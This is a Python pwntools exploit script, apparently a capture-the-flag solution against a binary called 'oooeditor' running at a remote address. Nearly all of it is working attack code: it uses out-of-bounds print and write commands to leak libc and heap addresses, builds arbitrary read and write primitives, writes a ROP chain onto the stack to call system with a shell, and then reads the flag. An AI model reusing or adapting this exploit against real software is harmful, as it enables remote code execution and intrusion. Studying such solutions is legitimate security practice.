#!/usr/bin/env python
# encoding: utf-8

import time, random, string
from random import randint
from pwn import remote, process, ELF, gdb
from pwn import context
from pwn import p32,p64,u32,u64,asm

context(arch='amd64', os='linux', log_level='info', terminal=['tmux', 'splitw', '-h'])
#LOCAL  = True
LOCAL  = False
PROG    = "./oooeditor"
LIBC    = "./libc.so.6"
elf     = ELF(PROG)
libc    = ELF(LIBC)

r = None

class random_str:
    nullable = True
    local = True
    junk = 'A'

    def __init__(self):
        while True:
            self.libc_base = randint(0x7f0000000, 0x7ffa00000) << 12
            if '\n' not in p64(self.libc_base):
                break
        while True:
            self.elf_base = randint(0x555555554, 0x568000000) << 12
            if '\n' not in p64(self.elf_base):
                break

    def _get_rand_address(self):
        while True:
            addresses = [0x400800, 0x601000, self.elf_base, self.libc_base]
            s = p64(choice(addresses) + randint(0, 0x10000))
            if '\n' not in s:
                return s

    def _get_rand_fmstr(self):
        types = ['%{}c', '%{}$hn', '%{}$n', '%*{}$c', '%{}$p']
        fmstr = choice(types).format(randint(6, 99))
        fmstr += choice(types).format(randint(6, 99))
        return fmstr

    def _get_rand_str(self, n):
        if self.nullable:
            charset = map(chr, range(0, 256))
        else:
            # you can change charset here
            # charset = map(chr, range(1, 9) + range(0xe, 0x20) + range(0x21, 0x100))    # no whitespace and null
            charset = map(chr, range(1, 10) + range(11, 0x100))    # no newline and null
        return ''.join([choice(charset) for _ in xrange(n)])

    def __mul__(self, n):
        if self.local:
            return junk * n

        if not self.nullable:
            return self._get_rand_str(n)

        if n < 8:
            return self._get_rand_str(n)

        fuck = ''
        while len(fuck) < n:
            t = randint(0, 20)
            if t == 0:
                fuck += self._get_rand_fmstr()
            elif 1 <= t <= 10:
                fuck += self._get_rand_str(8)
            else:
                fuck += self._get_rand_address()

        return fuck[:n]

def attach(addr):
    if addr <= 0x400000:
        addr = addr + 0x555555554000
    #gdb.attach(r, gdbscript='symbol-file ./%s\nb *0x%x' % (PROG+'.dbg', addr))
    gdb.attach(r, gdbscript='b *0x%x' % (addr))

def newio(host, port):
    if LOCAL:
        r = process(PROG)
    else:
        r = remote(host, port)
    return r

# exploit

def o_print(size, offset=0):
    r.recvuntil(']> ')
    r.sendline('p %d @%d' % (size, offset))

def o_write(ch, offset=0):
    r.recvuntil(']> ')
    r.sendline('w %s @%d' % (ch, offset))

def o_open(f):
    r.recvuntil(']> ')
    r.sendline('o %s' % (f))

def exploit(host):
    global r
    port = 8297 # define port here

    r = newio(host, port)
    A = random_str()    # instance of random_str, can be used as `A*0x100`
    A.local = LOCAL
    A.junk = 'A'

    o_open('a.png')
    #oprint(0x100, -0x7ee0)
    #o_print(0x0000bfcc, -0x63d0)
    o_print(0x8, -0x63d0)

    main_arena = 0
    for i in xrange(8):
        main_arena += int(r.recv(2),16)*(0x100**i)
        r.recv(1)

    print hex(main_arena)

    o_print(0x8, -0x63d0+0x78)

    heap = 0
    for i in xrange(8):
        heap += int(r.recv(2),16)*(0x100**i)
        r.recv(1)
    heap += (0x20+0x63d0)
    print hex(heap)

    #attach(0x401DF6)
    print hex(elf.got['malloc'])
    o_print(0x8, (elf.got['malloc']-heap))
    p = r
    from pwn import unhex
    data = p.recvline()
    malloc = u64(unhex(data.replace(" ", "")[:16]))

    system = malloc -293936
    print hex(system)
    base = heap
    off = 0x604650 - base
    print off

    free_hook = system+3794088
    for i in range(7):
        p.sendlineafter("[0x00000000]> ", "w 255 @ {}".format(off+i))

    def ar_read(addr):
        off = addr - base
        p.sendlineafter("[0x00000000]> ", "p 8 @ {}".format(off))
        data = p.recvline()
        heap = u64(unhex(data.replace(" ", "")[:16]))
        print hex(heap)
        return heap

    def ar_write(addr, n):
        off = addr - base
        for i in range(8):
            p.sendlineafter("[0x00000000]> ", "w {} @ {}".format(ord(p64(n)[i]), off+i))

    #ar_write(free_hook, system)
    environ_addr = system+3796056
    stack = ar_read(environ_addr)
    print hex(stack)
    sh_addr = 1460826+system
    rop_addr = stack - 0xf8
    ar_write(rop_addr, 0x4013b6)
    ar_write(rop_addr+8, sh_addr)
    ar_write(rop_addr+16, system)
    p.sendlineafter("[0x00000000]> ", "w 217 @ {}".format(rop_addr-8-base))
    p.clean()
    p.sendline("cat flag")
    return p.recvline()[:-1]

if __name__ == '__main__':
    # local test code here
    host = '10.13.37.24'
    flag = exploit(host)
    print flag

